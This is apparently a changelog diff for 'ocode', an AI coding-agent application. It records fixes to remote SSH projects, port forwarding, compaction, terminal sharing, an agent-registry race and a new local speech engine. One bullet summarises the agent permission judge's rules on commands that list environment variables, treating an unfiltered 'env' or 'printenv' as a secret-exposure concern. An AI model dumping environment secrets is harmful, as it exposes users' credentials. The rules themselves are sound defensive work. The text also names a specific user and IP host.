@@ -1,5 +1,1082 @@
 # Changelog
 
+## 2026-09-30 — Skill-doc audit: a new `ocode-remote-ssh` field guide, and corrections across the `ocode-*` skills
+
+A read-only audit of `skills/` found 17 stale line anchors and ~10 false claims
+across the `ocode-*` skills; the seven files below were corrected and one new
+skill added. `TODO.md` records the four deferred items (chiefly: the older
+user-level forks under `~/.config/opencode/skills/` could shadow the project
+copies if the search-path precedence ever flips).
+
+- **New `skills/ocode-remote-ssh/SKILL.md`** (221 lines) — a field guide to the
+  remote SSH/WSL subsystem: the file map (`internal/remote/*`,
+  `internal/server/remote_*.go`, `execcmd.go`/`ssh.go`/`portmap.go`), the
+  **connection-identity invariant** (a live connection is keyed by user + host +
+  **port**; `Target.String()` deliberately omits the port and is good only for
+  project identity), the ssh argv/ControlPath rules, the exec-slot pool, the
+  path-spelling mismatch class, host-side provisioning, and where the remote
+  agent actually runs. Written as an index + invariant list that links `docs/`
+  and `AGENTS.md` rather than copying their prose.
+- **`ocode-agent-architecture`.** Line-number anchors replaced with symbol/type
+  lookups; a new *advisor config is PER SESSION* subsection (`advisor_config.go`,
+  `SetAdvisorConfig`/`ResolvedAdvisorConfig`, precedence `OPENCODE_ADVISOR_MODEL`
+  > session pin > `cfg` > built-in default, an empty session model meaning "use
+  the built-in default", `SetParentAdvisorConfig` inheritance, and a separate
+  `advisorEnabled` gate); the tool loop's `RunPostHook` now correctly shown to
+  see the **untruncated** result (truncate runs later in `Step`); and the
+  permission-ask path corrected to the `PERMISSION_ASK:` sentinel
+  (`OnPermissionAsk` is set only on sub-agents).
+- **`ocode-tools`.** Same truncate/hook-order fix; `InitBuiltinTools` is called
+  from each process entry point, not from `NewAgent`; the permission-default
+  story corrected (the `NewPermissionManager` baseline is overlaid by
+  `defaultPermissionConfig` and the user's `permissions.tools`, so `task` is
+  `ask` and `ast`/`imagegen` are allow only via config); the tool table fixed
+  (`undo_file_change` = ask, `webfetch` = parallel, `ast_grep` = ask).
+- **`ocode-permissions`.** Added the loopback carve-out's "nothing redirects"
+  condition; the two-judge split (the chat judge emits only allow/ask; the
+  TypeSafe/Jev judge emits a typed allow/deny gated by a confidence floor); the
+  environment-name-listing carve-out (naming variables or redacting values
+  allows — `env | cut -d= -f1`, `compgen -v`, `sed 's/=.*/=<set>/'`; a bare
+  `env`/`printenv`/`set` with no filter is the concern); and the fail-closed
+  `expandBashForJudge` rules (an unmodelled rebinding is opaque; a
+  secret-naming substitution is withheld).
+- **`ocode-usage`.** The chat judge's allow/ask-only limit is no longer applied
+  to the TypeSafe judge; the provider list now says to read
+  `internal/agent/client.go`'s `providers` map (39 keys) instead of enumerating
+  it, and records the keys a prior version omitted (`typesafe`, `orcarouter`,
+  `aihubmix`, `chutes*`, `runinfra`, `nvidia`, `302ai`, `codex`, the `xiaomi*`
+  variants, `novita-ai`) — noting `novita` was never a real key.
+- **`ocode-tui`.** Line-count anchors refreshed; `chat_search.go`'s shared
+  `flashAndScrollToMessage` primitive documented (the find bar and prompt-jump
+  both delegate to it — a second caller must not re-implement ensure-visible →
+  re-render → `SetYOffset`); new `internal/tui/user_jump.go` added to the file
+  map.
+- **`ocode-web`.** `web/src/lib/userMessageNav.ts` added to the file map.
+- **`ocode-mem`.** `/mem update` corrected to run on the **main agent with the
+  session's primary model** (`runMemCmd` → `buildMemUpdatePrompt` →
+  `sendCustomCommandPrompt` → `streamStep` on `m.agent`), not a sub-agent and not
+  the small model — the small model is only the maintenance worker.
+- **`team-onboarding`.** Documented that `!`-prefixed lines in a skill body are
+  **not auto-executed** — `internal/skill/loader.go` reads only frontmatter, so
+  the model must run each as a normal `bash` call; the TUI's leading-`!` input
+  (`startShellExecution`) is a separate user affordance.
+
+## 2026-09-30 — a remote project's sidebar chat list is a live view, not the host's whole history
+
+- **The symptom.** Expanding a remote (SSH/WSL) project's status line in the
+  sidebar listed **every** session the host had ever persisted, not just the
+  ones in play. Once remote session listing actually loaded, a project with a
+  long history buried the chats the user was working in under dozens of past
+  ones.
+- **What.** `web/src/components/Layout/RemoteProjectStatus.tsx` now filters the
+  inventory to chats that are **open as a tab in this window OR running an agent
+  turn on the host** (`visibleSessions`, `:92`). The collapsed `N chats` count
+  tracks the same filtered set, so the count always matches the expanded rows;
+  the empty state reads "No open chats" (was "No chats"). `running` comes from
+  the per-host `runs` bus (App opens one stream per host and routes frames by
+  `session_id`), so a remote chat running with no local tab is still listed — the
+  filter must not hide it.
+- **Reaching a closed chat.** The sidebar inventory used to double as the opener
+  for any session. That role now belongs to the **Sessions dialog**
+  (`SessionDialog.tsx`), which fetches and opens from `activeProject`, host
+  included — the path that binds the tab to the remote host so
+  `resolveSessionHost` routes it through `/api/remote/{host}/...`.
+- **Tests.** `RemoteProjectStatus.test.tsx` pins all four membership cases
+  (open-only, running-only, both, neither) and the empty state;
+  `App.tabFocusRemote.test.tsx` seeds the remote chat as an open tab (the
+  inventory no longer opens closed chats); `SessionDialog.test.tsx` gains
+  "opens a closed remote session with its host bound".
+- **Docs.** `docs/concepts/remote-persistent-sessions-terminals.md` § Sidebar UI,
+  the 2026-09-18 design spec, and the frontend-sidebar plan are updated in place
+  to record the live-view semantics.
+
+## 2026-09-30 — The Ports panel no longer stalls on a forward it cannot open, and stops offering itself when the probe fails
+
+- **The symptom.** Opening a remote SSH project fired `GET /api/portmaps` as a
+  capability probe. The first list for a project also auto-started that project's
+  persisted forwards **inline**, and a forward whose tunnel could not come up
+  spends ~5s in `ForwardManager.Start`'s readiness probe
+  (`internal/remote/connect.go` `waitForTunnelReady` — 25 attempts × 200ms
+  dialing `127.0.0.1:<localPort>`). So the Ports button simply never appeared for
+  ~5s per dead forward, with no spinner to explain the wait. Nothing froze: the
+  probe was a promise in a `useEffect`, Go serves each request on its own
+  goroutine, and the desktop origin negotiates HTTP/2
+  (`internal/server/localtls_test.go` `TestSniffListenerServesPlainHTTPAndH2OnOnePort`),
+  so a parked probe is a stream rather than one of the browser's six sockets.
+  What made it *look* like a freeze was the button's absence.
+- **Isolation was real, and is now pinned by a test.**
+  `TestPortMapsSlowListDoesNotBlockOtherProjects` (now
+  `TestPortMapsListDoesNotBlockOnAutoStart`) uses a *second registered project*
+  as the canary, so it takes the same `reg.mu` an auto-start would take if a
+  future change held the registry lock across the open. Holding `reg.mu` across
+  `autoStartPortMaps` was verified to make the canary go from 0s to 4.7s.
+- **What.**
+  - `internal/remote/portmap.go` gains `RunAsync(what string, fn func())`: runs
+    `fn` on its own goroutine and recovers + logs any panic. The recover is
+    load-bearing, not padding — an unrecovered panic on *any* goroutine
+    terminates the whole server, so a background forward open that panicked
+    would take down the app and every session in it.
+  - `internal/server/handler_portmaps.go` `HandleListPortMaps` now answers from
+    persisted state immediately and opens the forwards through `RunAsync`. Rows
+    report `live: false` until the open lands, which is exactly how a disabled
+    or not-yet-opened forward already rendered. `autoStartOnce` still guarantees
+    a single auto-start per project per process. **The user-initiated add/enable
+    paths stay synchronous on purpose** — their 502 carries "enabled, but failed
+    to open now: …" to the panel, which is worth the wait.
+  - `internal/desktop/boot.go` `startRemoteServer`: the auto-start loop is
+    extracted to `(*portMapsHandler).autoStartEnabled` and run via `RunAsync`.
+    It previously ran **before `net.Listen`**, so one dead forward delayed the
+    window appearing. (That remote-workspace mode is only reachable through a
+    hand-written `~/.local/share/ocode/workspace.json`; no UI writes one, so
+    this is a latent fix rather than one anyone has hit.)
+  - `web/src/api/client.ts` `isPortMapsAvailable` now returns `false` for
+    *every* failure. It previously returned `true` for anything that was not a
+    404, so a 500 or a transport error rendered a Ports button whose every
+    action then failed — the gate is "did the server hand me a list?", and a
+    5xx is not evidence the feature exists.
+  - **The panel re-fetches while a forward is still opening** — required by the
+    async auto-start above, and easy to miss: the widget only refreshed on
+    dialog open / project change, so rows would have sat on a stale
+    `enabled, not live` until the user reopened the dialog.
+    `PortMapsWidget` now re-fetches every 1.2s while any **enabled** forward is
+    not live, up to 12 attempts (~14s — forwards open sequentially and a dead
+    one costs ~5s), budget reset per dialog open. A **disabled** forward is
+    never polled (the user asked for it to be down, so it could never
+    converge), and the finite budget means a host that never returns settles on
+    a truthful "enabled, not live" row. The decision is the pure
+    `shouldPollForLive` in the new `web/src/lib/portMapsLivePoll.ts`, so the
+    budget is unit-tested without waiting it out.
+- **Tests.** `internal/server/handler_portmaps_test.go`
+  (`TestPortMapsListDoesNotBlockOnAutoStart`,
+  `TestPortMapsAutoStartRunsAfterListResponds`),
+  `internal/remote/portmap_test.go` (`TestRunAsyncRecoversAndLogsPanic`,
+  `TestRunAsyncReturnsBeforeFnFinishes`),
+  `internal/desktop/portmaps_test.go`
+  (`TestAutoStartEnabledOpensOnlyEnabledForwards`,
+  `TestAutoStartEnabledToleratesNilStore`),
+  `web/src/api/client.portmaps.test.ts` (new `isPortMapsAvailable` describe).
+  All mutation-verified: re-inlining the auto-start fails the timing test
+  (5.03s), and dropping the enabled-check in `autoStartEnabled` fails the desktop
+  test. The desktop test binds a listener on the *disabled* forward's local port
+  on purpose — with it unbound the open would fail on the probe and the assertion
+  would pass either way (an earlier version of that test was vacuous, which a
+  surviving mutant exposed).
+
+## 2026-09-30 — A failed compaction now stops instead of looping, and gives your queued messages back
+
+- **The symptom.** A session whose summary kept timing out produced an endless run of
+  `⚠ Compaction failed: compact: summary timed out` lines — one per turn, with no way out
+  except switching sessions. A real session hit this five times in a row.
+- **Why it looped (three compounding causes).** A failed pass never touches the transcript,
+  so the context stays over threshold and nothing records that anything went wrong:
+  1. `Agent.MaybeCompactAsync` re-evaluated only `enabled` + threshold on every call. There
+     was no failure memory, backoff, or cooldown anywhere in `internal/agent` — the sole
+     guard was `compactMu.TryLock` ("another compaction in flight"). Every trigger point
+     (TUI `askAgent` pre-flight, TUI post-turn, server post-turn, and both permission/question
+     continuations) therefore started the identical failing pass again.
+  2. The TUI's `compactFinishedMsg` honoured `pendingCompactResume` **unconditionally**. Both
+     trigger points defer a turn through that flag, so a failed pass re-dispatched the turn
+     that was waiting on it — re-sending the same oversized prompt and immediately re-arming
+     the compaction that had just failed.
+  3. The shared drain/resume tail ran after a failure too, so queued commands auto-dispatched.
+- **What.** A failed pass now latches auto-compaction off and the session stays usable.
+  - `Agent.compactFailed` (atomic.Bool) latches ON on a non-nil `CompactResult.Err` and OFF
+    on `OK: true`; `MaybeCompactAsync` declines while latched. An `OK=false, Err=nil` pass (the
+    "nothing to compact" short-circuit) deliberately does NOT latch, or a session that briefly
+    had no compactible middle would lose auto-compaction forever. `Agent.CompactFailed()`
+    exposes the latch. The re-arm on a manual `/compact` sits in `startCompactAsync` *after*
+    the client/`TryLock` guards, so a `/compact` that could not start does not resume the loop
+    it was meant to escape.
+  - TUI `compactFinishedMsg` returns early on failure instead of falling through to the shared
+    tail. That early return is the only thing stopping the loop — mutation-tested (removing it
+    fails; an earlier `resume = false` turned out to be dead code and was removed). Skipping
+    the tail also skips the queue drain, because a drained command resets the composer and a
+    queued `/compact` would instantly re-run the pass that just failed.
+  - **Queued messages go back to the composer** (both surfaces), since a failed pass never
+    reaches the LLM and the queue is the only place that input exists: queued text first in
+    submission order, then the user's current draft as the suffix, joined with one `"\n"`;
+    blank entries dropped. Commands are not inlined — they stay queued and dispatchable. The
+    web preserves the caret exactly (offset-shifted `selectionStart`/`selectionEnd` in a layout
+    effect; a `requestAnimationFrame` hop was tried first and let the browser paint the caret
+    at the stale offset). The TUI can only put it at the end — the bubbles textarea exposes no
+    way to address an arbitrary caret.
+  - A message typed while streaming is also handed to the live agent loop via
+    `EnqueueInjection`; restoring it without dropping the matching pending injection would send
+    it twice, so that reconciliation is now the shared `discardPickedUpInjections`.
+- **User-visible.** TUI: `⚠ Compaction failed: <err> (conversation continues uncompacted;
+  auto-compaction is off until /compact succeeds)`, plus a transient
+  `↩ your queued message was returned to the input box` when something was restored. You can
+  keep typing and sending; `/compact` re-arms auto-compaction once the cause is fixed.
+
+## 2026-09-30 — A terminal started in the desktop app is now visible in a second browser
+
+- **The symptom.** Start a terminal on a remote SSH project in the desktop app, then look at
+  the same project in another browser on the same server: no terminal tab, and the remote
+  project's sidebar row reporting `0 terminals`. The shell was demonstrably alive the whole
+  time — a remote project's pty is a child of the HOST's `ocode serve --remote`.
+- **Root cause (two independent bugs).**
+  1. **The open-terminal TAB LIST was per-origin `localStorage`.** `terminalPersistence.ts`
+     kept `ocode.ui.terminals.project.v1`, and the store's only cross-window sync was the
+     `storage` event — which by specification does not cross browser profiles. Session
+     tabs had already been moved server-side for exactly this reason, and `internal/tabs`'
+     package doc names this failure verbatim ("a project can show tabs in the desktop app
+     but 0 in a browser"). Terminals were never migrated, so the list was the only part of
+     the terminal that could not cross. A grep for `terminal-tabs|terminal_tabs` across
+     Go+TS returned zero hits before this change, confirming there was no server-side
+     terminal tab state at all.
+  2. **The host inventory never refetched.** `useRemoteTerminals` fetched only when the
+     host's `connected` flag flipped or on `eventBus.onReconnect` — no refetch on
+     expand, no polling. A browser that was already open could never catch up, which is
+     why the row said `0 terminals` indefinitely rather than briefly.
+- **What.** New `internal/termtabs` (`terminals.json` under the global data dir — same
+  cross-process lock, mtime-stamp reload and atomic-rename discipline as `internal/tabs`)
+  behind `GET/PUT /api/terminal-tabs`, keyed by the client's opaque `<host::path>` composite
+  and never `filepath.Clean`d (that would mangle `wsl:Ubuntu::/home/x` and `C:\Users\dev\app`).
+  The PUT is a merge: a provided key replaces, an empty `terminals` list deletes, absent keys
+  are preserved — so a client that has never seen another client's projects cannot wipe
+  them. `terminalStore` hydrates from the server, re-seeds live projects on
+  `terminal_tabs_changed` and on every bus reconnect, and writes through. `activeId` stays
+  per-client (it is focus state and can be `PROCESSES_TAB_ID`, which is not a terminal).
+  `localStorage` survives only as a mirror, so the synchronous *peek* that
+  `getProjectTerminals`, `TopTabs` and `ProcessesPanel` rely on still works; the write-through
+  is suppressed until the initial restore settles, so a mirror-derived list cannot clobber the
+  server, and pre-server state is migrated once per project the server has never seen.
+- **A takeover protocol, because sharing the list alone would ping-pong.** A terminal has
+  ONE attachment slot: `attach()` closes the socket it displaces, and that close is clean
+  (1000) — byte-identical to a shell exiting. With the list now shared, two browsers would
+  each render the tab, and every wake would make them alternately evict each other, the same
+  failure shape as the 2026-09-19 two-sockets-per-terminal reconnect loop. So the server now
+  sends `{"type":"detached","reason":"superseded"}` on the displaced socket before closing
+  it, and `TerminalPanel` parks in a takeover state ("another client took over —
+  reconnecting is paused") with a **Take over** button, reconnecting nothing until the user
+  asks for it back.
+- **Tests.** `TestTerminalSupersededSocketReceivesDetachFrame`,
+  `TestTerminalSupersededSocketIsClosedAfterDetachFrame`,
+  `TestTerminalConcurrentAttachLeavesSingleOwner` (6 racing clients, `-race`),
+  `TestTerminalTabsRoutesAreRegistered` / `...DoesNotShadowTerminalIDRoutes` (real mux — a
+  handler-only test cannot catch a missing route),
+  `internal/termtabs` round-trip / merge / opaque-key / concurrent-writer / corrupt-file
+  cases, and `terminalStore.shared.test.tsx` (two clients on one fake server: opens, adopts,
+  closes, and host-qualified key isolation). Each mutation-verified: removing the detach
+  frame, the merge semantics, the alert pruning, or the `onWake` takeover guard each fails a
+  named test. Full web suite 310 files / 2735 tests green.
+
+## 2026-09-30 — Desktop logs renderer main-thread stalls
+
+- **Why.** The desktop UI freezes for ~10s occasionally (worst case during several
+  back-to-back compactions). The Go backend was idle in a CPU profile and the WebKit renderer
+  cannot be profiled headlessly, so there was no timestamped evidence to attribute a freeze to.
+- **What.** `web/src/lib/debug/frontendStallReporter.tsx` detects main-thread stalls by timer
+  drift (WebKit has no Long Tasks API) and POSTs each stall ≥2s after it ends to
+  `POST /api/debug/frontend-stall`, which writes a `frontend-stall:` line to `desktop.log`
+  with `stall`, `dom_nodes` and `active_compactions`. Hidden-page ticks are ignored
+  (throttling, not a stall). Correlate the timestamp with `compact.log` / `desktop.log`.
+- **Tests.** `TestFrontendStallLogged`, `frontendStallReporter.test.tsx`.
+
+## 2026-09-30 — A session that stops accepting replies no longer stays stuck on "interrupted"
+
+- **The symptom.** A chat that had been left with unanswered trailing user messages reported
+  `interrupted: true` from `GET /api/sessions/{id}/state` forever, and **every new message
+  was silently thrown away**: each turn ran, produced a reply, and the reply was discarded
+  at save time. Users saw "keep interrupted" and lost work on every retry.
+- **Mechanism (proven from the session's own logs).** The resident agent held *fewer*
+  messages than the stored transcript. `internal/session/sqlitestore.go` drops any live
+  snapshot whose stored rows are not a byte-identical prefix, so every snapshot was dropped
+  (`stored rows are not a prefix of the snapshot`); the turn-end save then hit
+  `ErrTranscriptConflict` and `persistTurnTranscript` re-synced memory to disk **discarding
+  the turn's output**. The tail therefore never advanced past the unanswered user row, and
+  the interrupted classifier — correctly — kept reporting it.
+- **Root cause fixed — `bootstrapEntryAgent` no longer strips history by pending COUNT.**
+  It removed `PendingCount` trailing rows from the freshly loaded transcript, trusting the
+  queue length. The pending queue is in-memory and a cancel *deliberately retains* its
+  message "for retry after Resume", so it can hold entries with no matching trailing row on
+  disk; the count-based strip then deleted **settled** history. `pendingStripLen`
+  (`internal/server/agent_session.go`) now matches pending **content** against the tail of
+  the transcript and stops at the first mismatch, so only genuinely-pending trailing rows
+  are withheld. A leak is not hidden: `PendingCount` still reports the entry.
+  Regression: `TestPendingStripLen` (6 cases). Verified red first against the shipped
+  count-based logic — *"pendingStripLen = 2, want 0"*, i.e. an agent built with 1 of 3
+  stored messages, the exact wedge.
+- **Self-healing recovery — a turn-end conflict now releases the agent.** Re-syncing memory
+  to disk is not sufficient: the next turn re-derives its base from the *resident* agent, so
+  a diverged view can re-diverged on every subsequent turn. `persistTurnTranscript` now
+  schedules the teardown via the existing `closePending` marker, which `executeTurnJob`'s
+  deferred `drainPendingClose` services once the turn unwinds — so the next turn
+  re-bootstraps from disk, where memory and the stored transcript agree by construction.
+  It logs a distinct, greppable line
+  (`hit a transcript conflict; releasing the agent so the next turn re-bootstraps from disk`).
+  Regression: `TestTurnEndConflictSchedulesAgentRelease`.
+- **Both fixes mutation-verified**, with the mutant proven to COMPILE first (a build failure
+  is not a kill): reverting the strip body fails 4 subtests; removing the release scheduling
+  fails the conflict test. `go build ./...`, `go vet ./internal/server/`, `gofmt`, and the
+  full `internal/server` (154s) + `internal/agent` (106s) suites are green.
+
+## 2026-09-30 — MeloTTS is a third local speech engine, listed between Piper and Kokoro
+
+- **The engine.** `melo` (`internal/tts/manifest.go`) joins the local speech engines with
+  the full `not-accepted → license-accepted → pinned → downloading → installed → enabled`
+  pipeline and an MIT license disclosure. It appears in **Settings → Speech playback
+  between Piper and Kokoro**. That placement is a real contract, not a coincidence:
+  `TTSForm` maps the server response without re-sorting, so the rendered order *is* the
+  `Catalog()` return order. Pinned on both sides — `TestMeloCatalogSitsBetweenPiperAndKokoro`
+  (Go) and `renders MeloTTS between Piper and Kokoro` (web), each mutation-verified by
+  moving `melo` after `kokoro` and watching each fail. Five speakers ship as voices
+  (`EN-US` default, `EN-BR`, `EN_INDIA`, `EN-AU`, `EN-Default`), selectable per model
+  through the existing `model_voice` override. No component changes were needed: the card
+  is driven entirely by manifest fields, so license → install → enable → voice works from
+  the existing generic UI.
+- **Ten artifacts, every byte pinned** by a verified SHA-256 *and* exact size: the MeloTTS
+  source archive (commit `2091453`, the project's last commit), the `MeloTTS-English-v2`
+  config and 198 MB checkpoint, five `bert-base-uncased` files, and two NLTK archives.
+  Hugging Face LFS oids were confirmed to be the files' real SHA-256 by downloading
+  `checkpoint.pth` and hashing it to `794226eb…`, matching the published oid exactly —
+  that is the evidence for trusting the oids on `model.safetensors` without a second
+  440 MB fetch.
+- **Three silent network paths, each found by running the thing rather than reading it.**
+  (1) MeloTTS is **not pip-installed**: its `setup.py` registers a post-install hook that
+  shells out to `python -m unidic download` — an unpinned download into the user's home
+  during install — and reads `install_requires` from `requirements.txt`, leaving torch
+  unpinned. The verified archive is unpacked into the cache and imported via `PYTHONPATH`
+  so every dependency comes from the pins. (2) `melo/text/english_bert.py` calls
+  `from_pretrained("bert-base-uncased")` **at module scope**; the first real synthesis
+  pulled ~440 MB from the Hub, visible only as a `LOAD REPORT` line in the log.
+  (3) `g2p_en` probes for the NLTK corpora and calls `nltk.download()` when they are
+  missing, which writes into the **process working directory** — the same cwd-relative
+  trap as the ONNX `:memory:.ses` gotcha. All three are closed, and the child process
+  gets an explicit `cmd.Dir` plus `HF_HUB_OFFLINE=1` so a future regression fails loudly
+  instead of quietly downloading.
+- **The offline contract took two iterations and both failures are now regression tests.**
+  The first `from_pretrained` redirect looked right and passed a string-presence test, but
+  the real run failed: `from_pretrained` is a `classmethod`, so a wrapper that named the
+  bound class `name` and then re-passed the class left transformers resolving the *class
+  object* as a Hub repo id. The test that now pins it executes the driver against stub
+  modules, and it is mutation-verified against the old signature. The second run then
+  showed `melo/text/cleaner.py` eagerly importing all six language backends, each loading
+  its own tokenizer at module scope — including bare ids like
+  `bert-base-multilingual-uncased` that a "does it look like a Hub id" slash test let
+  through. Only `bert-base-uncased` may now load, and only from the cache; everything else
+  raises `RuntimeError("… this engine is English-only")` **on first use**, so a missing
+  language is a named error rather than silently wrong audio. `english.py` genuinely calls
+  `distribute_phone()` out of `japanese.py`, which is why the stub replaces the *tokenizer
+  object* and never the module.
+- **`nltk==3.8.1` is pinned on purpose and a test says so.** From 3.9 the POS tagger
+  resource was renamed `averaged_perceptron_tagger_eng`, but `g2p_en` still probes for and
+  downloads the legacy name, so a newer nltk fails at synthesis with `Resource
+  'averaged_perceptron_tagger_eng' not found` *after* silently re-fetching data.
+- **Scope is deliberately narrow, and `TODO.md` records the rest.** Only `darwin/arm64` is
+  declared — the one host where the whole install was exercised for real — because the
+  phase-0 feasibility work requires a host be advertised as installable only once its
+  runtime is verified rather than assumed from an index. Other hosts report `unavailable`
+  with a reason instead of being offered and failing mid-install. Non-English voices need
+  their tokenizer artifacts added; the linux/windows torch wheels need a CPU-only pip index
+  that `PythonRuntime` cannot yet express. Install footprint is ~650 MB of artifacts plus a
+  torch venv, roughly an order of magnitude above Piper and Kokoro.
+- **Verification.** `TestMeloInstallAndSynthesizeReal` (opt-in via `MELO_TTS_E2E=1`) runs the
+  real installer — download, SHA-256 + size verify, unpack, venv build, import check — and
+  the real `meloSynth`, then re-hashes every artifact on disk and asserts nothing was
+  written relative to the working directory. `TestMeloArtifactURLsAreReachable` guards the
+  pinned URLs and sizes against upstream renames. 23 unit tests cover the manifest, catalog
+  order, voices, archive traversal, the offline environment, and the `meloSynth` argv
+  contract; `go build ./...`, `go vet`, `gofmt`, the web typecheck and `vite build` are
+  clean, and 198 Settings/Speech tests pass.
+
+## 2026-09-30 — `AgentRegistry` had no lock: a config reload raced every agent lookup
+
+- **The race.** `AgentRegistry` held `defs []AgentDefinition` and
+  `diagnostic []LoadDiagnostic` with **no synchronization whatsoever**.
+  `reloadMarkdownAgents` clears both, re-registers the built-ins and re-adds the
+  markdown entries, while `Get`, `All`, `SubAgents`, `PrimaryAgents` and
+  `Diagnostics` walk the same fields. Anything resolving an agent concurrently
+  races it — in production, `lookupHiddenAgent` from a background title-generation
+  goroutine reading while a config reload (`ApplyAgentConfig` →
+  `ReloadMarkdownAgents`, reached from `NewHandler` and `SetWorkDir`) repopulates
+  the registry. It surfaced as 13 `WARNING: DATA RACE` reports on a pristine
+  `HEAD` worktree, failing unrelated tests such as
+  `TestHandleRetrySessionRefusesActiveTurn`.
+- **The fix is a lock at the registry's boundary.** An `RWMutex` whose WRITE lock
+  spans a WHOLE rebuild, not just the final assignment — a reader arriving
+  mid-reload would otherwise see a half-built list. Every reader takes the read
+  lock.
+- **`Get` now returns a pointer to a copy.** Callers keep the pointer and read
+  its fields after the call returns, and `addLoaded` mutates `r.defs[i]` in place,
+  so handing out a live pointer would let a future post-publication update
+  mutate values callers already hold. This is defence in depth: under the current
+  discipline (each reload clears `defs` first, building a fresh array) a live
+  pointer happens to stay valid, which is why the contract is pinned by a test
+  rather than asserted in the comment.
+- **`Diagnostics()` keeps its read lock but not a copy.** Nothing mutates the
+  diagnostic slice in place after publication, so a copy is justified by neither a
+  bug nor a test — an attempted copy was reverted when the mutation check showed
+  no test could catch it. The lock is load-bearing and kept: a rebuild reassigns
+  the field several times, so an unguarded read can see a half-built value.
+- **Regression test** `internal/agent/agent_registry_race_test.go`, mutation-
+  verified three ways — removing the write lock, removing a read lock, and
+  reverting the `Get` copy each make it fail, and all three mutants compile, so
+  none is a false kill. It uses a start barrier rather than sleeps, and reports 5
+  `DATA RACE`s against the unfixed registry versus clean at `-count=20` after.
+
+## 2026-09-30 — a remote project's session list loads again, and a failed one says so instead of spinning
+
+Reported as: *remote ssh project — the session list keeps loading, won't load ("Sessions — dev aims")*.
+`dev aims` is `~/www/aimsai2` on `james@217.216.72.49`. Two independent defects stacked, and neither
+was a hang — the server answered every request in well under 100 ms.
+
+- **The listing 404'd for every tilde-keyed remote project.** The client sends the path it registered,
+  `~/www/aimsai2`, and `api.listProjectSessions` prefixes `/api/remote/{host}` rather than passing
+  `?host=`. So the request reaches the host's `ocode serve --remote` carrying the tilde form — but that
+  host saved the project through the LOCAL branch of `HandleAddProject`, which expands `~`. Its registry
+  therefore held `/home/james/www/aimsai2`, and `HandleListProjectSessions` compared
+  `p.Path == projectPath` exactly, so it answered `404 {"error":"project not found in saved list"}`.
+  Confirmed live: the host reports the project as `/home/james/www/aimsai2` while the request carries
+  `~/www/aimsai2`; all four tilde-keyed remote projects were affected, not just this one.
+  `HandleListProjectSessions` now resolves through the existing `resolveRegisteredProjectRoot` helper —
+  verbatim first, home-expanded as a fallback — the same trust decision the git/fs endpoints already
+  made for exactly this mismatch. It narrows rather than widens the accepted set: an unsaved path, and a
+  `~user` form that `ExpandHome` deliberately leaves alone, are still 404. The resolved path is what gets
+  scanned, so a tilde project now lists its real sessions. The remote-entry branch (`?host=`) keeps its
+  exact `(host, verbatim path)` match, because that path belongs to another machine.
+- **A failed listing could strand the spinner forever.** `selectProject` raises `sessionsLoading` and then
+  *joins* an in-flight fetch if one exists — and a hover-warm over a connected remote row routinely has
+  one, because a proxied listing is a round-trip. The joined run's error path was gated on the
+  **initiating** caller's `background` flag, so a background hover's decision silently governed a
+  foreground click: the failure skipped the reset, and nothing else ever cleared it. `refreshProjectSessions`
+  no longer touches the flag at all; the caller that RAISED it now clears it in a `finally`, guarded so a
+  superseded selection cannot cut short its successor's spinner. A run cannot know whether the spinner on
+  screen is its own — that is the whole bug.
+- **`SET_ACTIVE_PROJECT` now resets `sessionsLoading`.** The remaining strand: selecting a project with a
+  warm cache returns early without raising a spinner, so an abandoned flag from the previous project had no
+  owner left to clear it. A newly active project has no fetch of its own in flight, so any pending spinner
+  belongs to the one just left.
+- **A failed listing is now reported.** The failure was `console.error` and nothing else, so a 404/502 was
+  indistinguishable from an empty project and the dialog said "No sessions yet" — a confident lie about a
+  list that was never retrieved. `refreshProjectSessions` rethrows (after logging) so the spinner-owning
+  caller can report it; the two branches with nothing to show for it — the hover warm and the cache-hit
+  revalidation — swallow explicitly, with the reason, so there is no unhandled rejection when a host blips.
+  `sessionsError` drives a `role="alert"` panel in the dialog.
+- **The recorded error is scoped to the project that produced it.** First cut got this wrong in three
+  ways, caught on review: a failure on a project the user then left kept its error, and because the dialog
+  prefers the error panel over the list, that error covered the *new* project's valid sessions; a slow
+  selection that failed after the user moved on stamped its error onto whatever was now on screen (and a
+  slow *success* cleared the new project's real error); and a hover warm or the dialog's forced
+  revalidation could recover the list while leaving the error panel sitting on top of it. So
+  `SET_ACTIVE_PROJECT` and the active-key branch of `SET_PROJECT_SESSIONS_CACHE` both clear it, and the
+  success/catch dispatches are guarded by the same still-active check as the spinner.
+- **The fix reaches the host through the normal version bump.** The 404 is served by the *remote* binary
+  (`~/.ocode/bin/0.8.116/ocode` on that box), so it only clears once provisioning pushes a build containing
+  it — which the 0.8.116 → 0.8.117 bump triggers on the next connect.
+- **Testing.** Four new Go cases (tilde resolution, plus three pinning that the fallback does not widen the
+  accepted set) and eight new web cases. Every one mutation-verified: restoring the original
+  `background`-gated error path fails three web cases with exactly the reported symptom
+  (`expected true to be false`); disabling the `SET_ACTIVE_PROJECT` spinner reset, the
+  `SET_PROJECT_SESSIONS_CACHE` error clear, the still-active guards, or the dialog's error panel each fail
+  a case. Two of those tests needed a second attempt — the first version of each passed against the broken
+  code because a *successful* sibling revalidation cleared the very flag/error under test as a side effect
+  of the cache-key match. A test that passes for the wrong reason is worse than no test, so each was
+  re-run with the sibling made to fail.
+- **Checked and cleared, not assumed.** The proxied session routes were suspected of the same tilde
+  mismatch ("sessions will list but not open"): they are not. `GET
+  /api/remote/{host}/api/sessions/{id}/state?project_path=~/www/aimsai2` returns 200, terminal handlers
+  already `ExpandHome`, and the file endpoints take `?host=` and run over SSH rather than being proxied —
+  so `allowedProjectRoots` is not in the remote path. `/debug/pprof/goroutine` showed no stuck SSH exec
+  (the live proxy goroutines are a WebSocket upgrade and SSE streams), and the uncommitted
+  `handler_remote_*` / `internal/remote` work touches neither this route nor path matching.
+
+## 2026-09-30 — the Cron tab now also holds reminders and a task list, with real mark/unmark status
+
+- **The gap.** The desktop/web Cron tab could only schedule recurring agent jobs. There was nowhere to
+  write "remind me to call the bank at 4" or "finish the quarterly report", and nowhere to tick it off.
+  The one adjacent thing in the codebase, `internal/tool`'s todo store, is NOT a substitute: it is the
+  agent's in-turn plan, one markdown file per SESSION at `.ocode/todo/<session-id>.md`, with no HTTP
+  surface and a single-turn lifetime. A reminder list is per PROJECT, outlives any session, and needs
+  REST. Different lifetimes, so a different store — but the delivery machinery is shared rather than
+  reimplemented (see the outbox note below).
+- **A new sibling engine, `internal/reminders`, not a `kind` field on `scheduler.Job`.** The lifecycles
